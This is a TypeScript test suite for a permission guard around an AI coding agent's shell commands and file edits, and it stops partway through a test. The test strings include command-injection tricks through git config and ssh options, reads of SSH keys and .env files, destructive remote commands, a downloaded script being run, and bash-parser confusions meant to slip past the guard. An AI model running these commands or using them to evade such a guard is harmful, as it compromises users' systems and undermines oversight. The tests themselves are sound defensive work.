// Decision-level regression tests. Run: npm test (node --test, TypeScript via type stripping).
// No model unless a test starts a stub: useClassifier is off, so what the rules leave open asks,
// with `by: "no-model"`. "ask" below means the rules themselves ask (`by: "rules"`); a command
// that merely went unclassified is "classify".
import { execFileSync } from "node:child_process";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { after, before, describe, test } from "node:test";
import assert from "node:assert/strict";
import http from "node:http";
import { anonymizeUrl, DEFAULT_ASK, decideFile, decideShell, expectedRepos, gitOnly, mirrorable, noteGitCall, projectRoots, sandboxBreaks, SessionState, urlBasename, usesSsh, type Decision, type Guard } from "../decide.ts";
import * as sandbox from "../sandbox.ts";
import { compileRules } from "../rules.ts";
import { DEFAULT_CLASSIFIER } from "../kev.ts";

const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "automode-test-"));
const repo = path.join(tmp, "repo");
const remote = path.join(tmp, "remote.git");
const git = (...args: string[]) => execFileSync("git", ["-C", repo, ...args], { encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] });
// The remotes are reached over ssh, as in real use: a push to a local path asks without a dry run
// (r3 20). A stand-in `ssh` on PATH runs the remote end in this machine's git, and notes how it was
// started: its arguments, its session and whether it could open a terminal.
const bin = path.join(tmp, "bin");
const sshLog = path.join(tmp, "ssh.log");
fs.mkdirSync(bin);
fs.writeFileSync(
  path.join(bin, "ssh"),
  [
    "#!/bin/sh",
    "{",
    "  printf 'args:'; printf ' [%s]' \"$@\"; printf '\\n'",
    "  if (: </dev/tty) 2>/dev/null; then echo tty=yes; else echo tty=no; fi",
    "  echo \"sid=$(cut -d' ' -f6 /proc/$$/stat)\"",
    "  echo \"askpass=[${SSH_ASKPASS-unset}] require=[${SSH_ASKPASS_REQUIRE-unset}] display=[${DISPLAY-unset}]\"",
    `} >> '${sshLog}'`,
    "while [ $# -gt 0 ]; do case \"$1\" in -o|-p|-l|-i|-F) shift 2 ;; -*) shift ;; *) break ;; esac; done",
    "shift",
    "exec sh -c \"$*\"",
    "",
  ].join("\n"),
  { mode: 0o755 },
);
process.env.PATH = `${bin}:${process.env.PATH}`;
const sshUrl = (p: string) => `ssh://automode-test.invalid${p}`;

const guard: Guard = {
  rules: compileRules({ ask: DEFAULT_ASK }),
  guarded: [path.resolve(import.meta.dirname, "..")],
  configDirs: [path.join(os.homedir(), ".config", "opencode")],
  allowedPaths: [],
  classifier: DEFAULT_CLASSIFIER,
  useClassifier: false,
  sshHosts: ["lab", "admin@lab"],
  sshReadOnlySudo: true,
  allowFeatureBranchPush: true,
};

const decide = (command: string, cwd = repo, g = guard) => decideShell(g, new SessionState(repo), cwd, command);
const effect = async (command: string, cwd = repo) => (await decide(command, cwd)).effect;
type Want = "allow" | "ask" | "classify" | "deny";
// What decided: the rules allowing, asking or denying, or the rules leaving it to the (absent) model.
const kind = (d: Decision): Want => (d.by === "no-model" ? "classify" : d.effect);
const expectEffect = (want: Want, commands: string[], g = guard) => {
  for (const c of commands) test(`${want}: ${JSON.stringify(c)}`, async () => {
    const d = await decide(c, repo, g);
    assert.equal(kind(d), want, `${c} -> ${d.effect} by ${d.by}: ${d.reason}`);
  });
};

before(() => {
  execFileSync("git", ["init", "-q", "--bare", "-b", "main", remote]);
  execFileSync("git", ["init", "-q", "-b", "main", repo]);
  git("remote", "add", "origin", sshUrl(remote));
  git("-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "init");
  git("push", "-q", "origin", "main"); // so the remote reports a default branch
  git("checkout", "-q", "-b", "feature/x");
  git("push", "-q", "-u", "origin", "feature/x"); // a plain `git push` needs an upstream to work at all
});
// Sets a config key for one test and puts back what was there.
const setConfig = (key: string, value: string) => {
  let old: string | undefined;
  try {
    old = git("config", "--get", key).trim();
  } catch {
    // unset
  }
  git("config", key, value);
  return () => (old === undefined ? git("config", "--unset", key) : git("config", key, old));
};
after(() => fs.rmSync(tmp, { recursive: true, force: true }));

describe("git push matcher", () => {
  expectEffect("allow", ["git push", "git push origin feature/x", "git push origin HEAD", `cd ${repo} && git push`]);
  expectEffect("ask", [
    "git push origin main",
    "git push --force origin feature/x",
    "git push origin +feature/x",
    "git push origin :feature/x",
    "git push origin feature/x:main",
    "git push origin release/1.2",
    "git push --tags",
    "git push --no-verify origin feature/x",
    "git push https://example.invalid/x.git feature/x",
    "git -c remote.origin.push=+HEAD:main push",
    "git --git-dir=.git push",
    // The reviewer's chain: change push config, then a plain push, in one tool call.
    "git config remote.origin.push +refs/heads/*:refs/heads/main && git push",
    "export GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.push GIT_CONFIG_VALUE_0=+HEAD:main; git push",
    "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.push GIT_CONFIG_VALUE_0=+HEAD:main git push",
    // Upstream setting writes .git/config, which the sandbox makes read-only.
    "git push -u origin feature/x",
    // Environment and -c overrides that change how git connects or what it runs.
    "GIT_SSH_COMMAND='ssh localhost touch /tmp/pwned' git push",
    "git -c core.sshCommand='ssh localhost' fetch",
    "git -c alias.x='!touch /tmp/pwned' x",
    // Destinations git expands to a protected branch.
    "git push origin feature/x:heads/main",
    "git push origin feature/x:refs/remotes/origin/main",
    // Programs chosen by the caller, and environment set without an assignment prefix.
    "git ls-remote --upload-pack='sh -c id' origin",
    "git fetch -u 'sh -c id' origin",
    "printf -v GIT_DIR /tmp/x; export GIT_DIR; git status",
    "export GIT_SSH_COMMAND",
    "declare -x GIT_SSH_COMMAND=x",
    "export LD_AUDIT=/tmp/x.so",
    "export GIT_{DIR,X}=/tmp/x; git status",
    "declare -n r=GIT_DIR; export r=/tmp/x; git status",
  ]);

  test("ask: pushing a tag", async () => {
    git("tag", "v1");
    try {
      assert.equal(await effect("git push origin v1"), "ask");
      assert.equal(await effect("git push origin v1:v2"), "ask");
    } finally {
      git("tag", "-d", "v1");
    }
  });

  test("ask: `git push origin @` on a protected branch", async () => {
    git("checkout", "-q", "main");
    try {
      assert.equal(await effect("git push origin @"), "ask");
    } finally {
      git("checkout", "-q", "feature/x");
    }
  });

  test("ask: a plain push goes to the branch's own remote, and that remote is unknown", async () => {
    const restore = setConfig("branch.feature/x.remote", "nowhere");
    try {
      assert.equal(await effect("git push"), "ask");
    } finally {
      restore();
    }
  });

  test("ask: a plain push on a branch with no upstream would only fail", async () => {
    git("checkout", "-q", "-b", "feature/no-upstream");
    try {
      assert.equal(await effect("git push"), "ask");
      assert.equal(await effect("git push origin feature/no-upstream"), "allow");
    } finally {
      git("checkout", "-q", "feature/x");
      git("branch", "-q", "-D", "feature/no-upstream");
    }
  });

  test("ask: pushing a copy of the repository built elsewhere", async () => {
    const copy = path.join(tmp, "copy");
    execFileSync("git", ["clone", "-q", repo, copy]);
    try {
      assert.equal(await effect(`git -C ${copy} push origin feature/x`), "ask");
      assert.equal(await effect(`cd ${copy} && git push origin feature/x`), "ask");
    } finally {
      fs.rmSync(copy, { recursive: true, force: true });
    }
  });

  test("ask: remote URL changed after the session started", async () => {
    const s = new SessionState(repo);
    assert.equal((await decideShell(guard, s, repo, "git push")).effect, "allow");
    git("remote", "set-url", "origin", path.join(tmp, "elsewhere.git"));
    try {
      assert.equal((await decideShell(guard, s, repo, "git push")).effect, "ask");
    } finally {
      git("remote", "set-url", "origin", sshUrl(remote));
    }
  });

  const withConfig = (key: string, value: string) => {
    test(`ask: git push with ${key}=${value} in config`, async () => {
      const restore = setConfig(key, value);
      try {
        assert.equal(await effect("git push"), "ask");
      } finally {
        restore();
      }
    });
  };
  withConfig("remote.origin.push", "+refs/heads/*:refs/heads/main");
  withConfig("remote.origin.pushurl", "https://example.invalid/x.git");
  withConfig(`url.https://example.invalid/.insteadOf`, sshUrl(remote));
  withConfig("push.default", "matching");
  withConfig("branch.feature/x.merge", "refs/heads/main");
  withConfig("core.sshCommand", "touch /tmp/pwned; ssh");
  withConfig("core.hooksPath", "/tmp");
});

describe("ssh matcher", () => {
  expectEffect("allow", [
    "ssh lab uptime",
    "ssh -o BatchMode=yes -o ConnectTimeout=8 lab 'df -h; systemctl status nginx'",
    "timeout 15 ssh -q -p 2222 admin@lab 'journalctl -u nginx -n 50 2>/dev/null'",
    "ssh lab 'sudo journalctl -n 5'",
  ]);
  expectEffect("ask", [
    "ssh -o ProxyCommand='touch /tmp/pwned' lab uptime",
    "ssh -oProxyCommand=x lab uptime",
    "ssh -o PermitLocalCommand=yes -o LocalCommand=x lab uptime",
    "ssh -F /tmp/config lab uptime",
    "ssh -J other lab uptime",
    "ssh -L 8080:localhost:80 lab uptime",
    "ssh -A lab uptime",
    "ssh -E /tmp/ssh.log lab uptime",
    "ssh lab",
    "ssh other uptime",
    "ssh lab make",
    "ssh lab 'cargo test'",
    "ssh lab 'cat $(echo /etc/passwd)'",
    "ssh lab 'ls > /tmp/x'",
    "ssh lab 'systemctl restart nginx'",
    "ssh lab 'ip route add 10.0.0.0/8 dev eth0'",
    "ssh lab 'journalctl --vacuum-time=1s'",
    "ssh lab 'sudo -u root bash'",
    "ssh lab 'rm -rf /srv/data'",
    "ssh lab 'cat ~/.ssh/id_ed25519'",
    // Read-only programs with options that write or run things.
    "ssh lab 'sudo uniq /dev/null /etc/passwd'",
    "ssh lab 'sort -o /etc/hosts /etc/hosts'",
    "ssh lab 'tree -o /tmp/x'",
    "ssh lab 'rg --pre /tmp/x.sh foo /'",
    "ssh lab 'sudo date -s 2020-01-01'",
    "ssh lab 'sudo hostname pwned'",
    "ssh lab 'sudo dmesg -C'",
    "ssh lab 'sudo ss -K dst 10.0.0.1'",
    "ssh lab 'find / -name x -delete'",
    "ssh lab 'sort --compress-program=sh /etc/hosts'",
    "ssh lab 'ip -batch /tmp/x'",
  ]);
});

describe("narrow -u ask", () => {
  expectEffect("allow", ["git add -u", "git stash -u", "git ls-files -u"]);
});

describe("git commands that write .git/config ask", () => {
  expectEffect("allow", ["git config --get user.name", "git config --list", "git remote -v", "git branch", "git status"]);
  expectEffect("ask", [
    "git config user.name x",
    "git config core.hooksPath /tmp",
    "git branch --set-upstream-to=origin/feature/x",
    "git checkout --track origin/feature/x",
    "git clone https://example.invalid/x.git",
    "git init newrepo",
    "git submodule add https://example.invalid/x.git",
  ]);
});

describe("project root comes from the session, not the working directory", () => {
  test("a symlink inside the project does not make its target the project", async () => {
    const outside = fs.mkdtempSync(path.join(os.homedir(), ".automode-test-outside-"));
    const link = path.join(repo, "link");
    fs.symlinkSync(outside, link);
    try {
      assert.equal(await effect("echo x > f", link), "ask");
      assert.equal(await effect("echo x > f", repo), "allow");
    } finally {
      fs.rmSync(link);
      fs.rmSync(outside, { recursive: true, force: true });
    }
  });
});

describe("Always-allow patterns", () => {
  for (const p of ["git status *", "npm run build *", "./scripts/check.sh *", "cargo test *", "git commit *"]) test(`mirrored: ${p}`, () => assert.ok(mirrorable(p)));
  for (const p of ["re:.* *", "*", "re:.*", "git *push* *", "rm -rf /* *", "a\nb *", "bash *", "xargs *", "python3 *", "env *", "git push *", "ssh lab-host *", "curl *", "sudo *",
    "awk *", "sed *", "tar *", "make *", "npm *", "docker *", "strace *", "gdb *", "unshare *", "uv run *", "git config *", "find *",
    "rg *", "fd *", "sort *", "git grep *", "git rebase *"])
    test(`not mirrored: ${JSON.stringify(p)}`, () => assert.ok(!mirrorable(p)));

  test("a mirrored pattern never overrides a firm ask (credential read)", async () => {
    const { compilePattern } = await import("../rules.ts");
    const picked: Guard = { ...guard, picked: [compilePattern("cat *")] };
    assert.equal((await decideShell(picked, new SessionState(repo), repo, "cat ~/.ssh/id_ed25519")).effect, "ask");
    assert.equal((await decideShell(picked, new SessionState(repo), repo, "cat README")).effect, "allow");
  });
});

describe("git-only calls and ssh use", () => {
  for (const c of ["git add -A && git commit -m x", "cd sub && git status", "git -C . log --oneline"]) test(`git-only: ${c}`, () => assert.ok(gitOnly(c)));
  for (const c of ["git log -1 --format=/tmp/x --output=.git/commondir", "git show HEAD:a > .git/commondir", "npm test && git commit -m x", "git rebase -x 'echo hi' main", "echo $(git rev-parse HEAD)", "mv .git g", "git bisect run ./t.sh"])
    test(`not git-only: ${c}`, () => assert.ok(!gitOnly(c)));
  const ssh = (c: string) => usesSsh(c, repo, new SessionState(repo));
  for (const c of ["git fetch", "ssh lab uptime", "git pull --rebase", "scp a lab:b", "git ls-remote origin"]) test(`uses ssh: ${c}`, () => assert.ok(ssh(c)));
  for (const c of [
    "git status", "make test", "cat ~/.ssh/config",
    "git ls-remote --upload-pack='sh -c x' origin", "git fetch -u x origin",
    "export PATH=.:$PATH; git ls-remote origin", "git fetch && cat ~/.ssh/id_ed25519",
    "git -C /tmp/x ls-remote o", "cd /tmp && git fetch", "PATH=. git fetch", "git -c core.sshCommand=x fetch",
  ]) test(`no ssh: ${c}`, () => assert.ok(!ssh(c)));

  test("no ssh for a nested repository with its own core.sshCommand", () => {
    const sub = path.join(repo, "sub");
    execFileSync("git", ["init", "-q", sub]);
    execFileSync("git", ["-C", sub, "config", "core.sshCommand", "/tmp/evil.sh"]);
    execFileSync("git", ["-C", sub, "remote", "add", "o", "lab:x"]);
    try {
      assert.ok(!ssh("cd sub && git fetch o"));
      assert.ok(!ssh(`git -C ${sub} fetch o`));
    } finally {
      fs.rmSync(sub, { recursive: true, force: true });
    }
  });
});

describe("git layout tampering pauses auto-allow", () => {
  test("a nested repository replaced after the session started pauses it", async () => {
    const nested = path.join(repo, "vendor", "lib");
    execFileSync("git", ["init", "-q", nested]);
    const s = new SessionState(repo);
    try {
      assert.equal((await decideShell(guard, s, repo, "git status")).effect, "allow");
      fs.rmSync(path.join(nested, ".git"), { recursive: true });
      execFileSync("git", ["init", "-q", nested]);
      const d = await decideShell(guard, s, repo, "git status");
      assert.equal(d.effect, "ask");
      assert.match(d.reason, /paused/);
    } finally {
      fs.rmSync(path.join(repo, "vendor"), { recursive: true, force: true });
    }
  });

  test("an approved git init in a project without a repository does not pause the session", async () => {
    const plain = fs.mkdtempSync(path.join(tmp, "plain-"));
    const s = new SessionState(plain);
    assert.equal((await decideShell(guard, s, plain, "ls")).effect, "allow");
    s.expecting.push({ dirs: [fs.realpathSync(plain)], at: Date.now() }); // what the plugin records when a `git init` it asked about is approved
    execFileSync("git", ["init", "-q", plain]);
    assert.equal((await decideShell(guard, s, plain, "ls")).effect, "allow");
  });

  test("a .git appearing without an approved git init pauses the session", async () => {
    const plain = fs.mkdtempSync(path.join(tmp, "plain-"));
    const s = new SessionState(plain);
    assert.equal((await decideShell(guard, s, plain, "ls")).effect, "allow");
    execFileSync("git", ["init", "-q", plain]);
    const d = await decideShell(guard, s, plain, "ls");
    assert.equal(d.effect, "ask");
    assert.match(d.reason, /paused/);
  });

  test("a planted commondir with an fsmonitor never runs inside the plugin, and the session pauses", async () => {
    const evil = path.join(tmp, "evil-gitdir");
    const marker = path.join(tmp, "fsmonitor-ran");
    execFileSync("cp", ["-a", path.join(repo, ".git"), evil]);
    execFileSync("git", ["--git-dir", evil, "config", "core.fsmonitor", `touch ${marker}; false`]);
    fs.writeFileSync(path.join(repo, "build.sh"), "#!/bin/sh\necho build\n", { mode: 0o755 });
    const planted = path.join(repo, ".git", "commondir");
    fs.writeFileSync(planted, evil + "\n");
    try {
      const d = await decideShell(guard, new SessionState(repo), repo, "./build.sh");
      assert.ok(!fs.existsSync(marker), "fsmonitor ran inside the plugin process");
      assert.equal(d.effect, "ask");
      assert.match(d.reason, /paused/);
    } finally {
      fs.rmSync(planted, { force: true });
      fs.rmSync(path.join(repo, "build.sh"), { force: true });
      fs.rmSync(evil, { recursive: true, force: true });
    }
  });

  test("a planted commondir makes everything ask for the session", async () => {
    const s = new SessionState(repo);
    assert.equal((await decideShell(guard, s, repo, "git status")).effect, "allow");
    const planted = path.join(repo, ".git", "commondir");
    fs.writeFileSync(planted, "/tmp/elsewhere\n");
    try {
      const d = await decideShell(guard, s, repo, "git status");
      assert.equal(d.effect, "ask");
      assert.match(d.reason, /paused/);
    } finally {
      fs.rmSync(planted);
    }
    // Sticky: removing it does not resume auto-allow in the same session.
    assert.equal((await decideShell(guard, s, repo, "git status")).effect, "ask");
  });
});

// ---- review findings ----

// A stub for the model server: answers every request with `answer(body)`.
async function withModel<T>(answer: (body: any) => unknown, fn: (g: Guard, seen: any[]) => Promise<T>, classifier: Partial<Guard["classifier"]> = {}): Promise<T> {
  const seen: any[] = [];
  const server = http.createServer((req, res) => {
    let text = "";
    req.on("data", (c) => (text += c));
    req.on("end", () => {
      const body = JSON.parse(text);
      seen.push(body);
      res.setHeader("content-type", "application/json");
      res.end(JSON.stringify(answer(body)));
    });
  });
  await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
  const port = (server.address() as { port: number }).port;
  try {
    return await fn({ ...guard, useClassifier: true, classifier: { ...DEFAULT_CLASSIFIER, endpoint: `http://127.0.0.1:${port}`, ...classifier } }, seen);
  } finally {
    server.close();
  }
}
const noul = (score: unknown) => () => ({ answers: { risky: { noul: score } } });

describe("A: syntax bash reads differently from the rules' parser asks", () => {
  expectEffect("ask", [
    "git fetch $'\\'' ; touch /tmp/automode-a1 #'", // A1
    "echo $\"x\"",
    "git fetch origin >&2#; touch /tmp/automode-a2", // A2
    "ls >&2#; touch /tmp/automode-a2",
    "cat <<E\"OF\"\ndata\nEOF\ntouch /tmp/automode-a3", // A3: bash's delimiter is EOF, the parser's E
    "cat <<EOF\ndata\n  EOF\ntouch /tmp/automode-a3\nEOF", // A3: an indented line is not the terminator
    "cat <<EOF\nnever closed",
    "ssh lab uptime $'\\n'id", // A4
    "x='$(id)'; echo ${x@P}",
    "echo `echo \\`id\\``",
    "echo $(echo ')' ; id)",
  ]);
  expectEffect("allow", [
    "echo hi # a comment",
    "echo 'a # b' \"c#d\"",
    "ls 2>&1",
    "ls >/dev/null 2>&1",
    "cat <<EOF > notes.txt\nplain text\nEOF",
    "cat <<'EOF' > notes.txt\n$(not run)\nEOF",
    "cat <<-EOF > notes.txt\n\tindented\n\tEOF",
    "echo $(date) ${HOME#/}",
  ]);
});

describe("B1/B2: git options", () => {
  expectEffect("ask", [
    "git fetch --upload-pa=/tmp/x .", // B1
    "git pull --upl=/tmp/x . main",
    "git ls-remote --upload-p /tmp/x .",
    "git --namespace status push --force origin main", // B2
    "git --namespace status reset --hard",
    "git --super-prefix status clean -fdx",
    "git --exec-path=/tmp/x status",
    "sudo git --namespace status push",
    "bash -c 'git --namespace status push --force'",
    "git -c core.fsmonitor=/tmp/x status",
  ]);
  expectEffect("allow", ["git --no-pager log --oneline", "git -C . status", "git -c color.ui=never status", "git --version"]);
  const ssh = (c: string) => usesSsh(c, repo, new SessionState(repo));
  for (const c of ["git fetch --upload-pa=/tmp/x .", "git fetch /tmp/elsewhere", "git fetch ext::/tmp/x", "git fetch --unknown-flag", "git fetch origin 'refs/heads/*'", "git fetch origin $(id)"])
    test(`no ssh agent: ${c}`, () => assert.ok(!ssh(c)));
});

describe("B3: asks do not depend on one spelling", () => {
  expectEffect("ask", [
    "/usr/bin/git -c core.fsmonitor=/tmp/x status",
    "/usr/bin/npm install",
    "npm --foreground-scripts install",
    "pip -q install x",
    "git --no-pager init x",
    "git -c color.ui=never init x",
    "/usr/bin/git clone https://example.invalid/x.git",
    "npm add x",
    "yarn",
    "bun i x",
    "go run example.invalid/pkg@latest",
    "env -0",
    "/usr/bin/env",
    "export",
    "declare -x",
    "XDG_CONFIG_HOME=/tmp/x git status",
    "sh -c '/usr/bin/npm install'",
    "timeout 60 npm ci",
  ]);
  expectEffect("allow", ["npm test", "npm run build", "FORCE_COLOR=1 npm test", "go build ./...", "cargo build"]);
  test("a user ask rule also matches the program named by path", async () => {
    const mine: Guard = { ...guard, rules: compileRules({ ask: [...DEFAULT_ASK, "terraform apply *"] }) };
    assert.equal(kind(await decide("/usr/local/bin/terraform apply -auto-approve", repo, mine)), "ask");
  });
});

describe("B4: the remote read-only matcher takes options from an allowlist", () => {
  expectEffect("ask", [
    "ssh lab 'sort --out=/etc/hosts /etc/hosts'",
    "ssh lab 'sort --compress-prog=sh /etc/hosts'",
    "ssh lab 'systemctl -p status restart nginx'",
    "ssh lab 'date --se=2020-01-01'",
    "ssh lab 'date -us2020-01-01'",
    "ssh lab 'sudo dmesg --cle'",
    "ssh lab 'ss --kil dst 10.0.0.1'",
    "ssh lab 'tree -ao /tmp/x'",
    "ssh lab 'journalctl --rot'",
    "ssh lab 'ip l s eth0 down'",
    "ssh lab 'ip link set eth0 down'",
    "ssh root@lab uptime",
    "ssh -l root lab uptime",
    "ssh lab 'cat /etc/hostname; echo $HOME'",
    "ssh lab uptime '&' reboot",
  ]);
  expectEffect("allow", [
    "ssh lab 'ip addr'",
    "ssh lab 'ip -br a'",
    "ssh lab 'ip route show'",
    "ssh admin@lab 'tail -n 20 /var/log/syslog | grep -i error'",
    "ssh -l admin lab uptime",
    "ssh lab 'systemctl status nginx --no-pager -n 20'",
    "ssh lab 'find /var/log -name \"*.log\" -mtime -1'",
    "ssh lab 'df -h && free -m'",
  ]);
});

describe("B5: credential files named by a glob or at run time", () => {
  before(() => fs.writeFileSync(path.join(repo, ".env"), "TOKEN=x\n"));
  after(() => fs.rmSync(path.join(repo, ".env"), { force: true }));
  expectEffect("ask", ["cat .env*", "cat .en?", "cat .e[n]v", "cat .{env,x}", "head -n 1 ./.e*"]);
  expectEffect("classify", ['cat "$(printf .env)"', "cat $f"]);
  expectEffect("allow", ["cat *.md", "ls .env*"]);
});

describe("E: files the session wrote", () => {
  expectEffect("classify", ["printf 'id > /tmp/automode-e1' > x.sh; sh x.sh", "cat > x.py <<'EOF'\nimport os\nEOF\npython3 x.py"]); // E1
  expectEffect("ask", ["PATH=/tmp/x:$PATH ls", "PATH=/tmp/x:$PATH; ls", "export PATH=/tmp/x:$PATH", "env PATH=/tmp/x ls", "HOME=/tmp/x git status"]); // E3

  test("E1: a script written by an earlier call goes to the model, which is shown the script", async () => {
    await withModel(noul(0.01), async (g, seen) => {
      const s = new SessionState(repo);
      assert.equal((await decideShell(g, s, repo, "printf 'echo marker-in-the-script' > later.sh")).effect, "allow");
      fs.writeFileSync(path.join(repo, "later.sh"), "echo marker-in-the-script\n"); // what the allowed call wrote
      const d = await decideShell(g, s, repo, "sh later.sh");
      assert.equal(d.by, "model", d.reason);
      assert.match(seen.at(-1).state.command, /marker-in-the-script/);
    });
    fs.rmSync(path.join(repo, "later.sh"), { force: true });
  });

  test("E2: editing a downloaded file does not make it the session's own", async () => {
    const s = new SessionState(repo);
    assert.equal((await decideShell(guard, s, repo, "curl -sSfo dl.sh https://example.invalid/install.sh")).effect, "allow");
    assert.equal(decideFile(guard, s, repo, path.join(repo, "dl.sh")), undefined);
    const d = await decideShell(guard, s, repo, "sh dl.sh");
    assert.equal(kind(d), "ask", d.reason);
    assert.match(d.reason, /downloaded/);
  });
});

describe("G: feature-branch push", () => {
  const push = async (s = new SessionState(repo)) => (await decideShell(guard, s, repo, "git push")).effect;
  const withKey = (key: string, value: string) =>
    test(`ask: git push with ${key}=${value} in the repository config`, async () => {
      git("config", key, value);
      try {
        assert.equal(await push(), "ask");
      } finally {
        git("config", "--unset", key);
      }
    });
  withKey("remote.origin.mirror", "true"); // G2
  withKey("push.followTags", "true");
  withKey("core.askPass", "/tmp/automode-askpass"); // G2, G4
  withKey("some.unknownKey", "x");

  test("G1: a config that cannot be read asks", async () => {
    const bin = fs.mkdtempSync(path.join(tmp, "bin-"));
    const real = execFileSync("sh", ["-c", "command -v git"], { encoding: "utf8" }).trim();
    fs.writeFileSync(path.join(bin, "git"), `#!/bin/sh\ncase " $* " in *" config "*"--show-scope"*) exit 3;; esac\nexec ${real} "$@"\n`, { mode: 0o755 });
    const before = process.env.PATH;
    process.env.PATH = `${bin}:${before}`;
    try {
      assert.equal(await push(), "ask");
    } finally {
      process.env.PATH = before;
    }
    assert.equal(await push(), "allow");
  });

  test("G3: a second URL added between two identical ones asks (git pushes to every URL)", async () => {
    const s = new SessionState(repo);
    assert.equal(await push(s), "allow");
    // remote.origin.url is now [remote, other, remote]: `git remote -v` ends on the first and
    // `get-url --push` starts with it, so comparing one of each sees no change.
    for (const url of [sshUrl(path.join(tmp, "other.git")), sshUrl(remote)]) git("config", "--add", "remote.origin.url", url);
    try {
      assert.equal(await push(s), "ask");
    } finally {
      git("config", "--replace-all", "remote.origin.url", sshUrl(remote));
    }
    assert.equal(await push(), "allow");
  });

  test("G5: a bare cd does not make the decision throw", async () => {
    assert.equal(kind(await decide("cd; ls")), "allow");
    assert.equal(kind(await decide("cd && git push")), "ask");
  });

  test("G6: what the matchers allow also gets the ssh agent", () => {
    const ssh = (c: string) => usesSsh(c, repo, new SessionState(repo));
    assert.ok(ssh("timeout 15 ssh lab uptime"));
    assert.ok(ssh("git -C . fetch origin"));
    assert.ok(ssh("timeout 60 git push origin feature/x"));
  });
});

describe("H1/H2: the model's answer and threshold", () => {
  const scored = (score: unknown, classifier: Partial<Guard["classifier"]> = {}) => withModel(noul(score), (g) => decide("frobnicate --all", repo, g), classifier);
  test("a low score allows", async () => assert.equal((await scored(0.01)).effect, "allow"));
  for (const score of [-1, 1.5, "0", null]) {
    test(`H1: score ${JSON.stringify(score)} is no answer and asks`, async () => {
      const d = await scored(score);
      assert.equal(d.effect, "ask");
      assert.equal(d.by, "model-error");
    });
  }
  for (const askAbove of [NaN, "0.2", undefined]) {
    test(`H2: askAbove ${String(askAbove)} asks`, async () => assert.equal((await scored(0.01, { askAbove: askAbove as number })).effect, "ask"));
  }
});

describe("C5/C7/C10: the pause says what it found, and can be resumed", () => {
  const fresh = () => {
    const dir = fs.mkdtempSync(path.join(tmp, "proj-"));
    execFileSync("git", ["init", "-q", dir]);
    return fs.realpathSync(dir);
  };
  test("C5: a repository created in a new subdirectory pauses, and is named", async () => {
    const dir = fresh();
    const s = new SessionState(dir);
    assert.equal((await decideShell(guard, s, dir, "ls")).effect, "allow");
    execFileSync("git", ["init", "-q", path.join(dir, "new", "sub")]);
    const d = await decideShell(guard, s, dir, "ls");
    assert.equal(d.effect, "ask");
    assert.match(d.reason, /paused/);
    assert.ok(d.reason.includes(path.join(dir, "new", "sub", ".git")), d.reason);
  });
  test("C7: a planted linked-worktree entry pauses and does not widen the project", async () => {
    const dir = fresh();
    const sibling = fs.mkdtempSync(path.join(path.dirname(dir), "sibling-"));
    const s = new SessionState(dir);
    assert.equal((await decideShell(guard, s, dir, "ls")).effect, "allow");
    const wt = path.join(dir, ".git", "worktrees", "x");
    fs.mkdirSync(wt, { recursive: true });
    fs.writeFileSync(path.join(wt, "gitdir"), path.join(sibling, ".git") + "\n");
    fs.writeFileSync(path.join(wt, "HEAD"), "ref: refs/heads/x\n");
    fs.writeFileSync(path.join(wt, "commondir"), "../..\n");
    fs.writeFileSync(path.join(sibling, ".git"), `gitdir: ${wt}\n`);
    const d = await decideShell(guard, s, dir, `echo x > ${path.join(sibling, "f")}`);
    assert.equal(d.effect, "ask");
    assert.match(d.reason, /paused.*worktrees/);
    assert.ok(!s.roots?.includes(sibling));
  });
  test("C7: config.worktree appearing in a git directory pauses", async () => {
    const dir = fresh();
    const s = new SessionState(dir);
    assert.equal((await decideShell(guard, s, dir, "ls")).effect, "allow");
    fs.writeFileSync(path.join(dir, ".git", "config.worktree"), "[core]\n\tfsmonitor = /tmp/x\n");
    assert.match((await decideShell(guard, s, dir, "ls")).reason, /paused.*config\.worktree/);
  });
  test("C10: deleting a nested repository is not tampering", async () => {
    const dir = fresh();
    execFileSync("git", ["init", "-q", path.join(dir, "vendor", "lib")]);
    const s = new SessionState(dir);
    assert.equal((await decideShell(guard, s, dir, "ls")).effect, "allow");
    fs.rmSync(path.join(dir, "vendor"), { recursive: true });
    assert.equal((await decideShell(guard, s, dir, "ls")).effect, "allow");
  });
  test("C10: touching the resume file ends the pause", async () => {
    const dir = fresh();
    const resumeFile = path.join(tmp, "resume");
    const g = { ...guard, resumeFile };
    const s = new SessionState(dir);
    assert.equal((await decideShell(g, s, dir, "ls")).effect, "allow");
    execFileSync("git", ["init", "-q", path.join(dir, "planted")]);
    const d = await decideShell(g, s, dir, "ls");
    assert.match(d.reason, /paused/);
    assert.ok(d.reason.includes(`touch ${resumeFile}`), d.reason);
    assert.equal((await decideShell(g, s, dir, "ls")).effect, "ask");
    fs.writeFileSync(resumeFile, "");
    fs.utimesSync(resumeFile, new Date(Date.now() + 1000), new Date(Date.now() + 1000));
    assert.equal((await decideShell(g, s, dir, "ls")).effect, "allow");
  });
  test("J1: a project-level opencode.json appearing pauses", async () => {
    const dir = fresh();
    const s = new SessionState(dir);
    assert.equal((await decideShell(guard, s, dir, "ls")).effect, "allow");
    fs.writeFileSync(path.join(dir, "opencode.json"), "{}\n");
    assert.match((await decideShell(guard, s, dir, "ls")).reason, /paused.*opencode\.json/);
  });
});

describe("J: opencode's project config and the edit tool", () => {
  expectEffect("ask", [
    "echo '{}' > opencode.json", // J1
    "mkdir -p .opencode/plugin && echo x > .opencode/plugin/a.ts",
    "cp a.ts .opencode/plugin/a.ts",
    "echo x >> .husky/pre-commit", // C9
    "sed -i s/a/b/ lefthook.yml",
    "tee .pre-commit-config.yaml",
  ]);
  const edit = (rel: string) => decideFile(guard, new SessionState(repo), repo, path.join(repo, rel));
  for (const rel of [".git/config", ".git/hooks/pre-commit", ".git/info/attributes", "opencode.json", "opencode.jsonc", ".opencode/plugin/x.ts", ".opencode/command/x.md", ".husky/pre-commit", "lefthook.yml", ".pre-commit-config.yaml"])
    test(`J2: editing ${rel} asks`, () => assert.equal(edit(rel)?.effect, "ask"));
  test("J2: editing a file in a core.hooksPath directory asks", () => {
    git("config", "core.hooksPath", "tools/hooks");
    try {
      assert.equal(edit("tools/hooks/pre-commit")?.effect, "ask");
    } finally {
